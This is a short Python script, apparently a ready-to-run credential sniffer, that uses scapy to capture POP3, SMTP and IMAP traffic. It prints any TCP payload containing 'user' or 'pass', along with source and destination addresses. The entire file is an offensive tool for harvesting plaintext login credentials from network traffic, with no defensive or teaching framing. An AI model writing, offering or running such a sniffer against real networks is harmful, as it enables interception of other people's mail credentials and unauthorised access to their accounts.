from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    """Process each captured packet"""
    if packet.haslayer(TCP) and packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        
        # Check for authentication keywords
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"\n[!] Potential Credentials Found [+]")
            print(f"[*] Source:      {packet[IP].src}")
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] Payload:")
            print("-" * 50)
            print(packet[TCP].payload.decode('utf-8', errors='ignore'))
            print("-" * 50)

def main():
    """Start the packet sniffer"""
    print("[*] Starting credential sniffer...")
    print("[*] Monitoring POP3(110), SMTP(25), and IMAP(143) traffic...")
    
    try:
        sniff(
            filter='tcp port 110 or tcp port 25 or tcp port 143',
            prn=packet_callback,
            store=0
        )
    except KeyboardInterrupt:
        print("\n[*] Sniffer stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == '__main__':
    main()
